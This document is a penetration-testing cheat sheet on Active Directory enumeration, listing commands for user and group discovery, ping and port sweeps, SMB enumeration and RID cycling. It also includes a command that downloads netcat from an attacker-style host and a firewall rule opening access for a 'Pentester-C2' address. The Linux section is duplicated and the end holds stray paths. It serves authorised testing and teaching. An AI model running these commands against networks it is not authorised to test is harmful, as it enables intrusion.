# Enumerating Active Directory

Enumerating Active Directory can provide valuable information about the network's structure and potential vulnerabilities during penetration testing

* [Active Directory Components](#active-directory-components)
* [CMD Tools](#cmd-tools)
* [PowerShell Tools](#powershell-tools)
* [Linux/Kali Tools](#linuxkali-tools)
* [Resources](#resources)

## Active Directory Components

* Domain Controllers:
  * Holds the AD DS data store
  * Handles authentication and authorization services
  * Replicate updates from other domain controllers in the forest
  * Allows admin access to manage domain resources
* AD DS Data Store:
  * Contains NTDS.dit which contains all AD DC information including password hashes for domain users
  * Stored by default in %SystemRoot%\NTDS
  * Accessible only by the domain controller
* Forest
  * Container that holds pieces of AD network
  * Forest is a collection of one or more domain trees inside
  * Forest consists of:
    * Trees - A hierarchy of domains in Active Directory Domain Services
    * Domains - Used to group and manage objects
    * Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
    * Trusts - Allows users to access resources in other domains
    * Objects - users, groups, printers, computers, shares
    * Domain Services - DNS Server, LLMNR, IPv6
    * Domain Schema - Rules for object creation
* Users
  * 4 primary types of user accounts:
    * Domain admins
    * Service accounts
    * Local administrators
    * Domain users
* Groups
  * Distribution groups: specify email distribution lists
  * Security groups: specify permissions for large number of users, including the following default security groups:
    * Domain Controllers - All domain controllers in the domain
    * Domain Guests - All domain guests
    * Domain Users - All domain users
    * Domain Computers - All workstations and servers joined to the domain
    * Domain Admins - Designated administrators of the domain
    * Enterprise Admins - Designated administrators of the enterprise
    * Schema Admins - Designated administrators of the schema
    * DNS Admins - DNS Administrators Group
    * DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
    * Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    * Group Policy Creator Owners - Members in this group can modify group policy for the domain Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    * Protected Users - Members of this group are afforded additional protections against authentication security threats. See <http://go.microsoft.com/fwlink/?LinkId=298939> for more information.
    * Cert Publishers - Members of this group are permitted to publish certificates to the directory
    * Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    * Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    * Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    * Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    * Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    * RAS and IAS Servers - Servers in this group can access remote access properties of users
* Domain Trusts
  * Put rules into place about domain interactions
  * Trusts allow users to gain access to other domain resources
  * Types of trusts:
    * Directional - The direction of the trust flows from a trusting domain to a trusted domain
    * Transitive - The trust relationship expands beyond just two domains to include other trusted domains
* Domain Policies
  * Like domain groups, except instead of permissions they contain rules
* Active Directory Domain Services
  * Services that a domain controller provides to the rest of the domain or tree

## CMD Tools

## Domain User Info with CMD

| Description                                  | Command   | Example                                                                                                          |
|----------------------------------------------|-----------|------------------------------------------------------------------------------------------------------------------|
| Domain Groups (run on DC)                    | `net`     | `net user`                                                                                                       |
| Dsquery User List                            | `dsquery` | `dsquery user domainroot`                                                                                        |
| User Logon Name with Email                   | `dsquery` | `dsquery * domainroot -filter   "(&(objectCategory=Person)(objectClass=User)(mail=e-mailaddress))"   -attr name` |
| Domain Admins of with Remote Trused   Domain | `dsquery` | `dsquery * -filter "(cn=Domain Admins)" -attr member -d   trustedDomain`                                         |
| Domain Users                                 | `wmic`    | `wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET   ds_samaccountname`                                     |
| Domain Groups                                | `wmic`    | `wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET   ds_samaccountname`                                    |
| Domain Computers                             | `wmic`    | `wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET   ds_samaccountname`                                 |
| View Domain User Info                        | `net`     | `net user /domain       net user pentestuser /domain`                                                            |
| Domain Admin Users                           | `net`     | `net group “Domain Admins” /domain`                                                                              |

## Enumerating with PowerShell

| Description                              | Cmdlet                | Example                                                                                                                                              |
|------------------------------------------|-----------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| Show SET                                 | `Get-ChildItem`       | `Get-ChildItem Env:` &#124; `ft Key,Value`                                                                                                           |
| Get Connected Drives                     | `Get-PSDrive`         | `Get-PSDrive` &#124; `where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}` &#124; `ft Name,Root`                                        |
| Ping Sweeper                             | `echo`                | `1..255` &#124; `% {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_` &#124; `Select-String ttl}`                                                  |
| Port Sweeper                             | `echo`                | `1..1024` &#124; `% {echo ((new-object   Net.Sockets.TcpClient).Connect("<IPADDR>", $_)) "Port $_   is open!"} 2>$null`                              |
| Sweep Range of IPs for Single Port       | `Test-NetwConnection` | `foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}`                                                    |
| Sweep IPs and Ports                      | `New-Object`          | `1..20` &#124; `% { $a = $_; 1..1024` &#124; `% {echo ((new-object   Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is   open!"} 2>$null}` |
| Test Egress Filtering                    | `New-Object`          | `1..1024` &#124; `% {echo ((new-object   Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port   $_ is open" } 2>$null`                       |
| Show Domain Admins                       | `ADSI`                | `([adsisearcher]'(memberOf=cn=Domain   Admins,CN=Users,dc=contoso,dc=com)').FindAll()`                                                               |
| Show Accounts that Don't Lock Out        | `dsquery`             | `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"`                                 |
| Web Client to Download Files (eg NetCat) | `wget`                | `wget "http://10.10.10.10/nc.exe" -outfile   "c:\nc.exe"`                                                                                            |
| Get Firewall Rules                       | `Get-NetFirewallRule` | ``Get-NetFirewallRule -all &#124; Out-GridView` or   `Get-NetFirewallRule -all &#124; Export-csv <file_path.csv>``                                   |
















A simple batch script with these commands is here: [\tools\WinDomainEnum.bat](https://github.com/EvolvingSysadmin/Penetration-Testing/blob/master/tools/WinDomainEnum.bat)





Display DC Address, Domain Name, Roles

```CMD
wmic ntdomain
```

Dsquery User List

```CMD
dsquery user domainroot
```

User Logon Name from Email

```CMD
dsquery * domainroot -filter "(&(objectCategory=Person)(objectClass=User)(mail=e-mailaddress))" -attr name
```

Display Trusted Domain

```CMD
dsquery * -filter "(objectclass=TrustedDomain)" -attr trustpartner,flatname,trustdirection
```

Domain Admins of from Remote Trused Domain

```CMD
dsquery * -filter "(cn=Domain Admins)" -attr member -d trustedDomain
```

Display All Domain Users

```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
```

Display All Domain Groups

```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname
```

Display All Domain Computers

```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
```

View Domain User Info

```CMD
net user /domain
 net user pentestuser /domain
```

Display Domain Admin Users

```CMD
net group “Domain Admins” /domain
```

View All Hosts in Domain/Workgroup

```CMD
net view
```

Display Network Shares

```CMD
net share
```

Display Domain Trust Info

```CMD
nltest
 nltest /finduser:sweppler
 nltest /dclist:mydomain
 nltest /trusted_domains
```

```batch
@echo off

echo Enumerating Active Directory objects...

dsquery * -filter "(objectCategory=user)" > ad_users.txt
dsquery * -filter "(objectCategory=group)" > ad_groups.txt
dsquery * -filter "(objectCategory=computer)" > ad_computers.txt

echo Active Directory information has been saved to the following files:
echo ad_users.txt
echo ad_groups.txt
echo ad_computers.txt
```

## PowerShell Tools

Ping Sweeper

```PowerShell
 1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_ | Select-String ttl}
```

Port Sweeper

```PowerShell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<IPADDR>", $_)) "Port $_ is open!"} 2>$null
```

Sweep Range of IPs for Single Port

```PowerShell
foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}
```

Sweep IPs and Ports

```PowerShell
1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
```

Test Egress Filtering

```PowerShell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port $_ is open" } 2>$null
```

Display Domain Admins

```PowerShell
([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname
```

Display Accounts that Don't Lock Out

```PowerShell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
```

Web Client to Download Files (eg NetCat)

```PowerShell
wget "http://10.10.10.10/nc.exe" -outfile "c:\nc.exe"
```

Get Firewall Rules

```PowerShell
Get-NetFirewallRule -all | Out-GridView
 Get-NetFirewallRule -all | Export-csv <file_path.csv>
```

Add Firewall Rule

```PowerShell
New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress <IPADDR>
```

Generate CSV with User Info

```powershell
Import-Module ActiveDirectory

$results = @()

Get-ADObject -Filter * -SearchBase "LDAP://dc=mydomain,dc=local" |
ForEach-Object {
    $results += $_
}

$results | Select-Object Name, ObjectClass, DistinguishedName |
Export-Csv -Path "C:\ADObjects.csv" -NoTypeInformation
```

## Linux/Kali Tools

 SMB Enumeration Tools

 ```bash
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain

```bash
nbtscan 192.168.1.0/24
```

Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing

```bash
enum4linux -a target-ip
```

Fingerprint SMB Version

```bash
smbclient -L //192.168.1.100 
```

Find open SMB Shares in Nmap

```bash
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
```

Enumerate SMB Users in Nmap

```bash
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
```

Enumerate SMB Using Samrdump Python Impacket

```bash
python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
```


## Linux/Kali Tools

 SMB Enumeration Tools

 ```bash
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain

```bash
nbtscan 192.168.1.0/24
```

Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing

```bash
enum4linux -a target-ip
```

Fingerprint SMB Version

```bash
smbclient -L //192.168.1.100 
```

Find open SMB Shares in Nmap

```bash
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
```

Enumerate SMB Users in Nmap

```bash
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
```

Enumerate SMB Using Samrdump Python Impacket

```bash
python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
```


ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
https://github.com/trustedsec/ridenum


Metasploit RID Cycling

```bash
use auxiliary/scanner/smb/smb_lookupsid
```

## Resources

* [Information dumper via LDAP](https://github.com/dirkjanm/ldapdomaindump)
* [Integrated DNS dumping by any authenticated user](https://github.com/dirkjanm/adidnsdump)
* [Advanced Discovery of Privileged Accounts](https://github.com/cyberark/ACLight)
* [Detailed Active Directory Recon Tool](https://github.com/sense-of-security/ADRecon)
* [Powershell AD Enumeration](https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf)
* [Data collector tool](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)


https://www.hackingarticles.in/impacket-guide-smb-msrpc/

 https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/

* A simple batch script with these commands: [\tools\WinNetEnum.bat](https://github.com/EvolvingSysadmin/Penetration-Testing/blob/master/tools/WinNetEnum.bat)

A simple batch script with these commands is here: [\tools\WinDomainEnum.bat](https://github.com/EvolvingSysadmin/Penetration-Testing/blob/master/tools/WinDomainEnum.bat)

"C:\Code\Penetration-Testing - Working\tools\WindowsEnum.ps1"

"C:\Code\Penetration-Testing - Working\tools\WinUserEnum.bat"

Get-ADUser -Filter * | Format-Table SamAccountName -A | Out-File .\users.txt
Get-ADComputer -Filter * | Format-Table SamAccountName -A

SANS BloodHound
